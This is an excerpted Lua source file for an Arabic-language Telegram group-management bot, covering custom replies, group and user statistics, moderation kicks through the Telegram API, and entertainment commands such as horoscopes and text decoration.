return send(msg.chat_id_, msg.id_,"⌔∮ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:CUKUR:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:CUKUR:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:CUKUR:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:CUKUR:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:CUKUR:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:CUKUR:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:CUKUR:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:CUKUR:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:CUKUR:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:CUKUR:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:CUKUR:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:CUKUR:Add:Rd:Sudo:Text2"..test, text)  
end  
send(msg.chat_id_, msg.id_,"⌔∮تم حفظ الرد")
return false  
end  
...
if text then
local Text = database:get(bot_id.."botss:CUKUR:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:CUKUR:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:CUKUR:Add:Rd:Sudo:Text2"..text)   
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'سوكر').." غادر" or text == 'بوت غادر' then  
...
if text == 'تفعيل المغادره' and DevHeDo(msg) then   
...
if text == 'تعطيل المغادره' and DevHeDo(msg) then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'o_vv_vv')..')'
local iduser = result.sender_user_id_
...
local HeDo = '⌔∮عدد الادمنيه : '..data.administrator_count_..
'\n\n⌔∮عدد المطرودين : '..data.kicked_count_..
'\n\n⌔∮عدد الاعضاء : '..data.member_count_..
'\n\n⌔∮عدد رسائل الكروب : '..(msg.id_/2097152/0.5)..
'\n\n⌔∮ اسم الكروب : ['..ta.title_..']'
send(msg.chat_id_, msg.id_, HeDo) 
end,nil)
end,nil)
end 
...
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da)  tdcli_function ({ ID = "SendChatAction",  chat_id_ = msg.sender_user_id_, action_ = {  ID = "SendMessageTypingAction", progress_ = 100}  },function(arg,ta)  tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)  tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,HeDo,success) 
if da.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'مشرف' 
...
local photps = (HeDo.total_count_ or 0)
...
local rdphoto = HeDoa[math.random(#HeDoa)]
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then      
...
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, HeDo.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
...
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, HeDo.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n⌔∮ايديك -› '..msg.sender_user_id_..'\n⌔∮معرفك -› '..username..'\n⌔∮رتبتك -› '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n⌔∮تفاعلك -› '..Total_Msg(Msguser)..'\n⌔∮رسائلك -› '..Msguser..'\n⌔∮السحكات -› '..edit..'\n⌔∮نقاطك -› '..NUMPGAME..'\n')
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'[\n⌔∮ايديك -› '..msg.sender_user_id_..'\n⌔∮معرفك -› '..username..'\n⌔∮رتبتك -› '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n⌔∮تفاعلك -› '..Total_Msg(Msguser)..'\n⌔∮رسائلك -› '..Msguser..'\n⌔∮السحكات -› '..edit..'\n⌔∮نقاطك -› '..NUMPGAME..']\n')
else
...
-- vardump(data) 
CUKURdx(msg.chat_id_, msg.id_, '⌔∮ايدي المجموعة -› ( '..msg.chat_id_..' )\n⌔∮عدد الادمنيه -› ( *'..data.administrator_count_..' )*\n⌔∮عدد المحظورين -› ( *'..data.kicked_count_..' )*\n⌔∮عدد الاعضاء -› ( *'..data.member_count_..' )*\n', 'md') 
end 
...
HeDo = text:match("^اضف رسائل (%d+)$")
database:set(bot_id..'id:user'..msg.chat_id_,HeDo)  
...
HeDo = text:match("^اضف نقاط (%d+)$")
database:set(bot_id..'idgem:user'..msg.chat_id_,HeDo)  
...
if text == 'استعاده الاوامر' and DevHeDo(msg) then
...
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/HeDo"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
...
database:set(bot_id.." HeDo:zhrf_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الزخرفه" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌔∮ تم تفعيل الزخرفه')
database:set(bot_id.." HeDo:zhrf_Bots"..msg.chat_id_,"open")
end
if text and text:match("^زغرفه (.*)$") and database:get(bot_id.." HeDo:zhrf_Bots"..msg.chat_id_) == "open" then
...
database:set(bot_id.." HeDo:brj_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌔∮ تم تفعيل الابراج')
database:set(bot_id.." HeDo:brj_Bots"..msg.chat_id_,"open")
end
if text and text:match("^برج (.*)$") and database:get(bot_id.." HeDo:brj_Bots"..msg.chat_id_) == "open" then
...
database:set(bot_id.." HeDo:age_Bots"..msg.chat_id_,"close")
end
if text == "تعطيل حساب العمر" and Manager(msg) then
send(msg.chat_id_, msg.id_, '⌔∮ تم تعطيل حساب العمر')
database:set(bot_id.." HeDo:age_Bots"..msg.chat_id_,"close")
...
database:set(bot_id.." HeDo:age_Bots"..msg.chat_id_,"open")
end
if text and text:match("^احسب (.*)$") and database:get(bot_id.." HeDo:age_Bots"..msg.chat_id_) == "open" then
...
database:set(bot_id.."HeDo:movie_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الافلام" and Mod(msg) then
send(msg.chat_id_, msg.id_,'⌔∮ تم تفعيل الافلام')
database:set(bot_id.."HeDo:movie_bot"..msg.chat_id_,"open")
end
if text and text:match("^فلم (.*)$") and database:get(bot_id.."HeDo:movie_bot"..msg.chat_id_) == "open" then
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'سوكر')
...
CUKUR = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(CUKUR)
...
------------------------------------------------------------------------
local CUKURAbot = database:get(bot_id.."CUKUR1:Add:Filter:Rp2"..text..result.chat_id_)   
if CUKURAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⌔∮العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n⌔∮["..CUKURAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local CUKUR1_Msg = database:get(bot_id.."CUKUR1:Add:Filter:Rp2"..text..result.chat_id_)   
if CUKUR1_Msg then    
send(msg.chat_id_, msg.id_,"⌔∮"..CUKUR1_Msg)
...
end -- end new msg dev.mr HeDo 
end -- end callback dev.mr HeDo
